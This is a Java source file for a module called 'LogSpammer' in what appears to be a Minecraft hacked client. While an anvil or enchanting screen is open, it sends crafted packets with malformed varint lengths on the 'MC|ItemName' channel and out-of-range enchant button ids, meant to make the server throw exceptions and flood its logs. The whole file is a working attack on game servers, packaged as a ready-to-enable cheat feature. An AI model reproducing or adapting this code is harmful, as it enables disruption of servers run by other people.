package io.github.alerithe.client.features.modules.impl.miscellaneous;

import io.github.alerithe.client.events.EventTick;
import io.github.alerithe.client.features.modules.Module;
import io.github.alerithe.client.features.properties.impl.BooleanProperty;
import io.github.alerithe.client.utilities.Wrapper;
import io.github.alerithe.events.Register;
import io.netty.buffer.Unpooled;
import net.minecraft.client.gui.GuiEnchantment;
import net.minecraft.client.gui.GuiRepair;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C11PacketEnchantItem;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class LogSpammer extends Module {
    private final BooleanProperty anvilSpam = new BooleanProperty("Anvils", new String[0], true);
    private final BooleanProperty enchantTableSpam = new BooleanProperty("EnchantTables", new String[0], true);

    public LogSpammer() {
        super("LogSpammer", new String[]{"logspam"}, Type.MISCELLANEOUS);

        getPropertyManager().add(anvilSpam);
        getPropertyManager().add(enchantTableSpam);
    }

    @Override
    public void enable() {
        Wrapper.printChat("\247eAnvils: \247rRight-click to activate.");
        Wrapper.printChat("\247eEnchantment Tables: \247rRight-click and place Lapis Lazuli to activate.");

        super.enable();
    }

    @Register
    private void onTick(EventTick event) {
        if (event.isInGame()) return;

        sendAnvilSpam();
        sendEnchantSpam();
    }

    private void sendAnvilSpam() {
        if (!anvilSpam.getValue()) return;
        if (!(Wrapper.getGame().currentScreen instanceof GuiRepair)) return;

        // Throws an IndexOutOfBoundsException
        {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeVarIntToBuffer(1);
            Wrapper.sendPacket(new C17PacketCustomPayload("MC|ItemName", buffer));
            Wrapper.printChat("Sent IndexOutOfBounds payload.");
        }

        // Throws a DecoderException
        {
            PacketBuffer buffer = new PacketBuffer(Unpooled.buffer());
            buffer.writeVarIntToBuffer(131069);
            Wrapper.sendPacket(new C17PacketCustomPayload("MC|ItemName", buffer));
            Wrapper.printChat("Sent Decoder payload.");
        }
    }

    private void sendEnchantSpam() {
        if (!enchantTableSpam.getValue()) return;
        if (!(Wrapper.getGame().currentScreen instanceof GuiEnchantment)) return;

        // Throws an IndexOutOfBoundException
        GuiEnchantment gui = (GuiEnchantment) Wrapper.getGame().currentScreen;
        if (gui.container.getLapisAmount() < 1) return;

        Wrapper.sendPacket(new C11PacketEnchantItem(gui.container.windowId, 3));
        Wrapper.printChat("Sent IndexOutOfBounds payload.");
    }
}
